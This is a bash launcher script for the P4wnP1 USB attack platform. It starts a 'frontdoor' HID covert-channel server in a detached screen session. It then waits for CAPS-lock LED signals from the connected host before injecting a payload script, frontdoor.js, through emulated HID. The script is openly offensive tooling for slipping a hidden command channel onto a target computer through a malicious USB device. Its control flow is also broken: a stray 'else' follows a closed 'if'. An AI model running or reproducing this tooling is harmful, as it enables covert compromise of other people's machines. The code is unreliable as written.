#!/bin/bash
hidraw=$(P4wnP1_cli usb get device raw)

if [ "$hidraw" = "" ]; then
        echo "[!] No raw HID device found, aborting";
        exit
fi


echo "[*] Starting hidserver.py for frontdoor covert channel payload..."
        touch /tmp/device_hid_mouse
        screen -dmS hidsrv bash -c "cd /usr/local/P4wnP1/scripts/frontdoor; python2 hidserver.py"
        echo "[+] Type \"screen -d -r hidsrv\" to switch to frontdoor cli"

        P4wnP1_cli hid run -c 'waitLED(CAPS);waitLED(CAPS);waitLED(CAPS);' && P4wnP1_cli hid run -n frontdoor.js &

       
else
        echo "[!] Frontdoor covert channel server already running"
fi